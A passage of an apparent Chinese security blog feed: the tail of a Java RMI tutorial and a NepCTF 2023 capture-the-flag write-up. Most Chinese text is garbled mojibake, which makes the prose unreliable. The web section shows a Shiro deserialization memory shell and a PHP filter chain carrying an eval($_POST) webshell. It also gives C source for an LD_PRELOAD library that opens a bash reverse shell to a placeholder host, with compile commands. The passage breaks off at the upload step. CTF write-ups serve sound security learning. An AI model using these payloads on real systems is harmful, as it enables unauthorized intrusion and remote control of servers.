class_">Remote</span> &#123;</span><br><span class="line">    <span class="comment">//sayHelloå°±æ˜¯å®¢æˆ·ç«¯è¦è°ƒç”¨çš„æ–¹æ³•ï¼Œéœ€è¦æŠ›å‡ºRemoteException</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>åœ¨æœåŠ¡ç«¯åˆ›å»ºå¦‚ä¸‹ä»£ç ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaRMI.Server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//æ³¨å†Œä¸­å¿ƒ</span></span><br><span class="line">        r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);<span class="comment">//æ³¨å†Œä¸­å¿ƒç»‘å®š</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå­—ç¬¦ä¸²è½¬å¤§å†™æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaRMI.Server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteObj</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line"><span class="comment">//        UnicastRemoteObject.exportObject(this,0);//å¦‚æœä¸ç»§æ‰¿UnicastRemoteObjectå°±éœ€è¦æ‰‹å·¥å¯¼å‡º</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upKeywords</span> <span class="operator">=</span> keywords.toUpperCase();</span><br><span class="line">        System.out.println(upKeywords);</span><br><span class="line">        <span class="keyword">return</span> upKeywords;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ¥å£ï¼ˆè¦ä¸å®¢æˆ·ç«¯ä¸€æ ·ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaRMI.Server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="comment">//sayHelloå°±æ˜¯å®¢æˆ·ç«¯è¦è°ƒç”¨çš„æ–¹æ³•ï¼Œéœ€è¦æŠ›å‡ºRemoteException</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¿è¡ŒæœåŠ¡ç«¯</strong></p><p><img src="/img/Java-RMI/rmi.png" alt=""></p><p><strong>è¿è¡Œå®¢æˆ·ç«¯</strong></p><p><img src="/img/Java-RMI/rmi_01.png" alt=""></p><p><strong>æŸ¥çœ‹æœåŠ¡ç«¯è¿›ç¨‹</strong></p><p><img src="/img/Java-RMI/rmi_02.png" alt=""></p><p>å‘ç°åœ¨å®¢æˆ·ç«¯è°ƒç”¨äº†æœåŠ¡ç«¯çš„å­—ç¬¦ä¸²è½¬å¤§å†™çš„æ–¹æ³•ï¼Œå¹¶è¾“å‡ºåˆ°æœåŠ¡ç«¯ï¼Œå®ç°äº†è¿œç¨‹æ‰§è¡Œä»£ç ï¼Œå®Œæˆäº†ä¸€æ¬¡ç®€å•çš„RMI</p><h1 id="æµç¨‹åŸç†"><a href="#æµç¨‹åŸç†" class="headerlink" title="æµç¨‹åŸç†"></a>æµç¨‹åŸç†</h1><p><img src="/img/Java-RMI/rmi_03.png" alt=""></p><p><strong>æ³¨å†Œä¸­å¿ƒï¼š</strong></p><p>ä½äºå›¾ä¸­éƒ¨åˆ†ï¼Œç±»ä¼¼äºå“ˆå¸Œè¡¨ï¼Œå¯¹åº”åå­—å’Œè¿œç¨‹å¯¹è±¡</p><p><strong>æœåŠ¡ç«¯ï¼š</strong></p><p>ä½äºå›¾å·¦éƒ¨åˆ†ï¼Œå‘å¸ƒè¿œç¨‹å¯¹è±¡</p><p><strong>å®¢æˆ·ç«¯ï¼š</strong></p><p>ä½äºå›¾å³éƒ¨åˆ†ï¼Œè¿æ¥æ³¨å†Œä¸­å¿ƒï¼Œè°ƒç”¨è¿œç¨‹å¯¹è±¡</p><blockquote><p>æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯ä¼ è¾“ç”¨çš„æ˜¯<code>Socket</code>ï¼Œåè®®ä¸ºJRMPåè®®</p><p>æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯è¿æ¥åˆ©ç”¨äº†ä»£ç†ï¼ŒæœåŠ¡ç«¯æ˜¯<code>Skeleton</code>ï¼Œå®¢æˆ·ç«¯æ˜¯<code>Stub</code></p><p>ä»£ç†çš„ä½œç”¨ï¼šæŠŠä¸€äº›ä¸šåŠ¡é€»è¾‘ä¹‹å¤–çš„ä¸œè¥¿æå–å‡ºæ¥</p></blockquote><p>æ¼æ´åœ¨é€šä¿¡éƒ¨åˆ†äº§ç”Ÿï¼Œè€Œå®ƒä»¬ä¹‹é—´ä¸¤ä¸¤ä¹‹é—´ä¼šæœ‰é€šä¿¡ï¼Œæ€»å…±ä¼šæœ‰å…­ä¸ªéƒ¨åˆ†</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å®¢æˆ·ç«¯-&gt;æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯-&gt;å®¢æˆ·ç«¯</span><br><span class="line">æœåŠ¡ç«¯-&gt;æ³¨å†Œä¸­å¿ƒï¼Œæ³¨å†Œä¸­å¿ƒ--&gt;æœåŠ¡ç«¯</span><br><span class="line">å®¢æˆ·ç«¯--&gt;æ³¨å†Œä¸­å¿ƒï¼Œæ³¨å†Œä¸­å¿ƒ--&gt;å®¢æˆ·ç«¯</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF 2023</title>
      <link href="/2023/08/17/NepCTF%202023/"/>
      <url>/2023/08/17/NepCTF%202023/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ä¸AIå…±èˆçš„å“ˆå¤«æ›¼"><a href="#ä¸AIå…±èˆçš„å“ˆå¤«æ›¼" class="headerlink" title="ä¸AIå…±èˆçš„å“ˆå¤«æ›¼"></a>ä¸AIå…±èˆçš„å“ˆå¤«æ›¼</h2><p>å°†ç»™çš„ä»£ç æ‰”ç»™gptï¼Œå‘ç°ç¼ºå°‘ä¸€æ®µä»£ç ï¼Œç›´æ¥è®©å®ƒå¸®å†™å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># Read frequency information</span></span><br><span class="line">        num_symbols = <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">        frequencies = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_symbols):</span><br><span class="line">            byte, freq_bytes = f.read(<span class="number">1</span>)[<span class="number">0</span>], f.read(<span class="number">4</span>)</span><br><span class="line">            freq = (freq_bytes[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (freq_bytes[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (freq_bytes[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | freq_bytes[<span class="number">3</span>]</span><br><span class="line">            frequencies[byte] = freq</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Rebuild Huffman tree</span></span><br><span class="line">        root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read compressed data</span></span><br><span class="line">        compressed_data = f.read()</span><br><span class="line">        bit_string = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(byte, <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> compressed_data)</span><br><span class="line"></span><br><span class="line">    current_node = root</span><br><span class="line">    decompressed_data = []</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> bit_string:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            current_node = current_node.left</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            current_node = current_node.right</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current_node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            decompressed_data.append(current_node.char)</span><br><span class="line">            current_node = root</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">bytes</span>(decompressed_data))</span><br></pre></td></tr></table></figure><h2 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h2><p>è¿›å»æ˜¯ä¸ªCè¯­è¨€çš„ä»£ç æ‰§è¡Œå™¨</p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-17_09-12-42.png" alt=""></p><p>æç¤ºè¯´ç¯å¢ƒå˜é‡é‡Œé¢æœ‰flagï¼Œå°è¯•æ‰“å°ç¯å¢ƒå˜é‡</p><p><a href="https://blog.csdn.net/aspnet_lyc/article/details/20548767">linuxä¸‹è·å–ç³»ç»Ÿç¯å¢ƒå˜é‡</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** arge)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(*arge)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, *arge++);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/NepCTF-2023/Snipaste_2023-08-17_09-14-34.png" alt=""></p><h2 id="é™Œç”Ÿçš„è¯­è¨€"><a href="#é™Œç”Ÿçš„è¯­è¨€" class="headerlink" title="é™Œç”Ÿçš„è¯­è¨€"></a>é™Œç”Ÿçš„è¯­è¨€</h2><p><img src="/img/NepCTF-2023/1.png" alt=""></p><p>ç»™äº†hintï¼š<code>Atsuko Kagari</code></p><p>å‘ç°äº†è¿™æ˜¯ä¸€ä¸ªåŠ¨æ¼«ï¼šå°é­”å¥³å­¦å›­</p><p>äº†è§£åˆ°è¿™æ˜¯æ–°æœˆæ–‡å­—å’Œå¤é¾™è¯­ï¼ˆæˆ‘çœ‹åƒé¸¡è„šè¯­ï¼‰</p><p>ç™¾åº¦è´´å§æ‰¾åˆ°å¯¹ç…§ï¼š</p><p><img src="/img/NepCTF-2023/2.png" alt=""></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HEARTISYOURMAGIC</span><br></pre></td></tr></table></figure><p><img src="/img/NepCTF-2023/3.png" alt=""></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NEPNEPABELIEVING</span><br></pre></td></tr></table></figure><p>æ‹¼èµ·æ¥</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepCTF&#123;NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC&#125;</span><br></pre></td></tr></table></figure><h2 id="å°å®å¼¹é’¢ç´"><a href="#å°å®å¼¹é’¢ç´" class="headerlink" title="å°å®å¼¹é’¢ç´"></a>å°å®å¼¹é’¢ç´</h2><p>ä¸‹è½½åå‘ç°æ˜¯ä¸€æ®µéŸ³é¢‘ï¼Œç”¨Audacityæ‰“å¼€</p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-12_11-00-17.png" alt=""></p><p>å‘ç°ä¸æ˜¯é•¿å°±æ˜¯çŸ­çš„ï¼ŒçŒœæµ‹æ˜¯æ‘©æ–¯å¯†ç ï¼Œä¸€ä¸ªä¸ªå¯¹ï¼Œå‘ç°çœŸæ˜¯ï¼Œå¾—åˆ°æç¤º</p><p><code>you should use this to xor something</code></p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-12_11-01-28.png" alt=""></p><p>å‘ç°äº†ä¸€æ®µå­—ç¬¦ä¸²</p><p><code>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</code></p><p>çœ‹æç¤ºåº”è¯¥æ˜¯è¦å¯»æ‰¾å¦ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œå°è¯•ä¸é¢˜ç›®ç»™çš„å­—ç¬¦ä¸²å¼‚æˆ–</p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-17_09-10-07.png" alt=""></p><p>æˆåŠŸï¼æ‹¿åˆ°flag</p><h2 id="ä½ ä¹Ÿå–œæ¬¢ä¸‰æœˆä¸ƒä¹ˆ"><a href="#ä½ ä¹Ÿå–œæ¬¢ä¸‰æœˆä¸ƒä¹ˆ" class="headerlink" title="ä½ ä¹Ÿå–œæ¬¢ä¸‰æœˆä¸ƒä¹ˆ"></a>ä½ ä¹Ÿå–œæ¬¢ä¸‰æœˆä¸ƒä¹ˆ</h2><blockquote><p>ä¸‰æœˆä¸ƒï¼šè€¶ï¼Œç»ˆäºæ¥åˆ°Nepnepæ˜Ÿçƒå•¦ï¼Œè®©æˆ‘çœ‹çœ‹æ­£åœ¨ç«çƒ­è¿›è¡Œçš„Hackerå¤ºæ——å¤§èµ›ç¾¤èŠã€‚å•Šï¼å¼€æ‹“è€…ï¼Œè¿™ç¾¤åçœ‹èµ·æ¥æ€ªæ€ªçš„è¯¶ã€‚ ï¼ˆä¼¸å‡ºè„‘è¢‹ï¼Œå‡‘è¿‘ç¾¤åï¼Œè½»è½»çš„é—»äº†ä¸€ä¸‹ï¼‰å“‡ï¼Œå¥½å’¸è¯¶ï¼Œå¼€æ‹“è€…ä½ å¿«æ¥çœ‹çœ‹ï¼</p><p>å¼€æ‹“è€…ï¼ˆU_idï¼‰ï¼š(ç«¯ç€ä¸‹å·´ï¼Œç£¨è¹­äº†ä¸€ä¸‹ï¼Œçœ¼ç¥è‹¥æœ‰æ‰€æ€ï¼‰è¿™å¥½åƒéœ€è¦ç»è¿‡å•¥256å¤„ç†ä¸€ä¸‹æ‰èƒ½å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„å…³é”®ã€‚</p><p>ä¸‰æœˆä¸ƒï¼šé‚£æˆ‘ä»¬å¿«æƒ³æƒ³æ€ä¹ˆè§£å¼€è¿™ä¸ªè°œé¢˜ï¼</p><p>flagæ ¼å¼:NepCTF{+m+}</p><p>hint:URLä¸ºå‹ç¼©åŒ…å¯†ç </p></blockquote><p><strong>txtæ–‡ä»¶ï¼š</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">salt_lenth= 10 </span><br><span class="line">key_lenth= 16 </span><br><span class="line">iv= 88219bdee9c396eca3c637c0ea436058 #åŸå§‹ivè½¬hexçš„å€¼</span><br><span class="line">ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</span><br></pre></td></tr></table></figure><p>é¢˜ç›®æè¿°ï¼šç¾¤åå¾ˆå’¸ï¼Œ<code>salt</code>ï¼ˆé•¿åº¦ä¸º10ï¼‰ï¼Œå› ä¸ºåŠ äº†NepCTFçš„QQç¾¤ï¼Œå‘ç°ç¾¤å<code>NepCTF2023</code>æ­£å¥½é•¿åº¦ä¸ºåï¼Œæ¨æµ‹<code>saltï¼šNepCTF2023</code></p><p>ç»è¿‡å•¥256å¤„ç†ä¸€ä¸‹æ‰èƒ½å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„å…³é”®ï¼šæ¨å‡ºsha256åå¾—åˆ°key(å…³é”®)</p><p>çŒœæµ‹æˆ‘ä»¬å¯¹<code>NepCTF2023</code>ç»è¿‡sha256åå¯ä»¥å¾—åˆ°<code>key</code> ï¼Œå–å‡ºå‰32ä½ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd8e671df3882c5be6423cd030bd7cb6</span><br></pre></td></tr></table></figure><p>ç„¶åAESè§£å¯†=&gt;hexè§£å¯†=&gt;base64è§£å¯†ï¼š</p><p><img src="/img/NepCTF-2023/20.png" alt=""></p><p><a href="https://img1.imgtp.com/2023/07/24/yOkXWSJT.png">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></p><p><img src="/img/NepCTF-2023/21.png" alt=""></p><p><strong>æ˜Ÿç©¹é“é“æ–‡å­—ï¼š</strong></p><p><img src="/img/NepCTF-2023/22.png" alt=""></p><p><strong>ç¿»è¯‘ä¸€ä¸‹ï¼š</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepCTF&#123;HRP_always_likes_March_7th&#125;</span><br></pre></td></tr></table></figure><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ezjava-Chekin"><a href="#Ezjava-Chekin" class="headerlink" title="Ezjava_Chekin"></a>Ezjava_Chekin</h2><p><a href="https://blog.csdn.net/dreamthe/article/details/124390531?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=shiro_attack-4.7.0-SNAPSHOT-al&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-124390531.142^v92^koosearch_v1&amp;spm=1018.2226.3001.4187">è¯¦ç»†shiroæ¼æ´å¤ç°åŠåˆ©ç”¨æ–¹æ³•ï¼ˆCVE-2016-4437ï¼‰</a></p><p>ç›´æ¥åˆ©ç”¨shiroååºåˆ—åŒ–å·¥å…·ä¸€æŠŠæ¢­</p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-12_10-56-01.png" alt=""></p><p>æ³¨å…¥å†…å­˜é©¬ï¼ˆæ¢jspç±»å‹ï¼‰</p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-12_10-56-34.png" alt="">è¿æ¥æˆåŠŸ</p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-12_10-57-05.png" alt=""></p><p>è®¿é—®start.shï¼Œæ‹¿åˆ°flag</p><p><img src="/img/NepCTF-2023/Snipaste_2023-08-12_10-57-43.png" alt=""></p><h2 id="Ez-include"><a href="#Ez-include" class="headerlink" title="Ez_include"></a>Ez_include</h2><p>è¿›å…¥é¡µé¢ï¼Œæœ‰å¦‚ä¸‹ç•Œé¢</p><p><img src="/img/NepCTF-2023/4.png" alt=""></p><p>å°†<code>?</code>åé¢çš„å†…å®¹åˆ å»åæ–¹è®¿é—®ï¼š</p><p><img src="/img/NepCTF-2023/5.png" alt=""></p><p>æç¤ºè®©æˆ‘ä»¬è®¿é—®<code>/jump.php?hint</code></p><p><img src="/img/NepCTF-2023/6.png" alt=""></p><p>å‘ç°è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œä¸”åŠ åç¼€<code>.txt</code>ï¼Œåœ¨æ³¨é‡Šé‡Œæç¤ºå¯ä»¥è®¿é—®<code>hint.ini</code></p><p><img src="/img/NepCTF-2023/7.png" alt=""></p><p>å‘ç°è¿œç¨‹æ–‡ä»¶åŒ…å«åˆ©ç”¨ä¸äº†ï¼Œæç¤ºé‡Œæœ‰ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p>å¯ä»¥åœ¨githubä¸Šæ‰¾åˆ°åˆ©ç”¨è„šæœ¬ï¼š<a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 php_filter_chain_generator.py --chain <span class="string">&quot;&lt;?php eval(<span class="variable">$_POST</span>[1]);?&gt;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/img/NepCTF-2023/8.png" alt=""></p><p>è¿™æ ·å°±æˆåŠŸäº†</p><p><img src="/img/NepCTF-2023/9.png" alt=""></p><p>ä½†æ˜¯æŸ¥çœ‹ä¸€ä¸‹<code>disable_functionsã€disable_classes</code> æŠŠå¾ˆå¤šçš„å‡½æ•°å’Œç±»ç»™ç¦ç”¨äº†,è¿˜é™åˆ¶äº†<code>open_basedir=/var/www/html:/tmp</code></p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æƒ³åŠæ³• <code>php disable_function bypass</code></p><p><img src="/img/NepCTF-2023/10.png" alt=""></p><p><strong>åŠ«æŒLD_PRELOADç»•è¿‡disable_functions</strong></p><blockquote><p>LD_PRELOADæŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œä¼šåœ¨å…¶å®ƒæ–‡ä»¶è°ƒç”¨ä¹‹å‰å…ˆè¢«è°ƒç”¨</p><p>åŠ«æŒæ­¥éª¤ï¼š</p><ol><li>ç”Ÿæˆä¸€ä¸ªæˆ‘ä»¬çš„æ¶æ„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶</li><li>åˆ©ç”¨putenvè®¾ç½®LD_PRELOADä¸ºæˆ‘ä»¬çš„æ¶æ„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶çš„è·¯å¾„</li><li>é…åˆphpçš„æŸä¸ªå‡½æ•°å»è§¦å‘æˆ‘ä»¬çš„æ¶æ„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶</li><li>Getshell</li></ol></blockquote><p>è¿™ä¸ªphpçš„å‡½æ•°å¾ˆå…³é”®ã€‚å¯ä»¥ä½¿ç”¨<code>mailã€error_log</code>ç­‰ï¼Œä½†æ˜¯è¿™é‡Œè¢«ç¦ç”¨äº†</p><p>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨<code>mb_send_mail()</code></p><p><img src="/img/NepCTF-2023/11.png" alt=""></p><p>å®ƒæ˜¯<code>mail()</code>çš„åŒ…è£…å‡½æ•°ï¼Œå› æ­¤ä¹Ÿå¯ä»¥è¿›è¡ŒåŠ«æŒ</p><p>æˆ‘ä»¬éœ€è¦å…ˆç¼–å†™ä¸€ä¸ªæ¶æ„poc.cæ–‡ä»¶ï¼š(ç”¨æ¥åå¼¹shell)</p><blockquote><p><strong>attribute</strong>è¯­æ³•æ ¼å¼ä¸ºï¼š<strong>attribute</strong> ( ( attribute-list ) )<br>è‹¥å‡½æ•°è¢«è®¾å®šä¸ºconstructorå±æ€§ï¼Œåˆ™è¯¥å‡½æ•°ä¼šåœ¨mainï¼ˆï¼‰å‡½æ•°æ‰§è¡Œä¹‹å‰è¢«è‡ªåŠ¨çš„æ‰§è¡Œã€‚ç±»ä¼¼çš„ï¼Œè‹¥å‡½æ•°è¢«è®¾å®šä¸ºdestructorå±æ€§ï¼Œ<br>åˆ™è¯¥å‡½æ•°ä¼šåœ¨mainï¼ˆï¼‰å‡½æ•°æ‰§è¡Œä¹‹åæˆ–è€…exitï¼ˆï¼‰è¢«è°ƒç”¨åè¢«è‡ªåŠ¨çš„æ‰§è¡Œã€‚ä¾‹å¦‚ä¸‹é¢çš„ç¨‹åºï¼š</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">angel</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vpsip/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åç¼–è¯‘ä¸€ä¸‹ç”Ÿæˆæ¶æ„åŠ¨æ€é“¾æ¥ç¨‹åº<code>poc.so</code>ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC poc.c -o poc</span><br><span class="line">gcc --share poc -o poc.so</span><br></pre></td></tr></table></figure><p><img src="/img/NepCTF-2023/12.png" alt=""></p><p>ç„¶åéœ€è¦æŠŠè¿™ä¸ªæ–‡ä»¶ç»™ä¸Šä¼ 